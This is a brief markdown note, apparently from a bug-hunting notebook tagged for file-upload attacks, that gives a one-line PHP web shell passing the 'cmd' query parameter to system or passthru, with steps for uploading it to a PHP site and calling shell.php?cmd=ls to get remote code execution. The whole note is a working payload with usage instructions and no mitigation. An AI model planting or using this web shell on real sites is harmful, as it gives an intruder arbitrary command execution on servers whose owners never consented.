---
tags:
  - Attack
  - Bugs/file-upload
---
shell.php -> 
<?php system($_GET['cmd']); ?> OR <?php passthru($_GET['cmd']); ?>
-  Upload this php file in a php based website to get shell(RCE).
-  Go to the path where file got uploded and add -> shell.php?cmd=ls
-  This file will give RCE.
-  [Sources] https://youtu.be/bERABgx-oOE?si=S3D2BeFn1-5ODyVx